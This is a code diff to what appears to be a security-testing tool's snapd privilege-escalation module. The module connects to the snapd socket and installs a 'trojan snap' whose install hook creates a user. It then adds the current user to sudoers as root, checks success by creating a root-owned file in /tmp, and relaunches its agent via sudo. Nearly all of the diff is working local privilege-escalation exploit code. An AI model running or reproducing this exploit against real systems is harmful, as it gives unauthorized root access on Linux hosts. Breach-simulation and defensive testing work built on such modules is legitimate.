@@ -67,7 +67,7 @@ def bind_sock(sockfile):
         client_sock.bind(sockfile)
     except socket.error as e:
         LOG.error('Failed to bind to the socket')
-        return  False
+        return False
 
     # Connect to the snap daemon
     LOG.info("Connecting to snapd API...")
@@ -76,7 +76,7 @@ def bind_sock(sockfile):
         client_sock.connect('/run/snapd.socket')
     except socket.error as e:
         LOG.error('Failed to connect to snapd.socket! The service snapd is not running')
-        return  False
+        return False
 
 
     return client_sock
@@ -200,7 +200,7 @@ def runCommandAsRoot(command):
 
     # Delete trojan snap, in case there was a previous install attempt
     if not delete_snap(client_sock):
-        return Fasle
+        return False
 
     # Install the trojan snap, which has an install hook that creates a user
     install_snap(client_sock, TROJAN_SNAP)
@@ -210,6 +210,7 @@ def runCommandAsRoot(command):
         return False
 
     LOG.info("Command Executed Successfully \n")
+    return True
 
 
 class snapdExploiter(HostPrivExploiter):
@@ -221,19 +222,28 @@ class snapdExploiter(HostPrivExploiter):
         whoami = os.popen('whoami').read()[:-1]
         LOG.info("Adding the current user %s to the sudoers list",whoami)
 
+        # we create a temp file in /tmp as root to verify command exec as root
+        alphabet = string.ascii_lowercase
+        filename = ''.join(random.choice(alphabet) for _ in range(10))
+        operation = 'touch /tmp/'
         # add the user to the sudo group
-        runMonkeyAsRoot = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
-        # runCommandAsRoot(runMonkeyAsRoot)
+        AddUserAsSudoers = ADDUSER_TO_SUDOERS % {'user_name' : whoami}
+        command = AddUserAsSudoers + " && " + operation + filename
 
-        # check if exploit is successful
-
-        if not check_if_sudoer():
+        if runCommandAsRoot(command):
+            # check if exploit is successful
+            file_path = "/tmp/%(filename)s"
+            if not check_if_sudoer(file_path %{'filename':filename}):
+                LOG.info("Either file doesn't exist or is not owned by root!")
+                return False
+        else:
+            LOG.info("Snapd Privilege escalation was not successful!")
             return False
 
+        LOG.info("The command that is executed as root is %s" % command)
         # now run the monkey as root
 
-        LOG.info("Running the monkey as root ")
-        command = "sudo "+ command
+        command = "sudo " + command
         monkey_process = subprocess.Popen(command, shell=True,
                                           stdin=None, stdout=None, stderr=None,
                                           close_fds=True, creationflags=0)
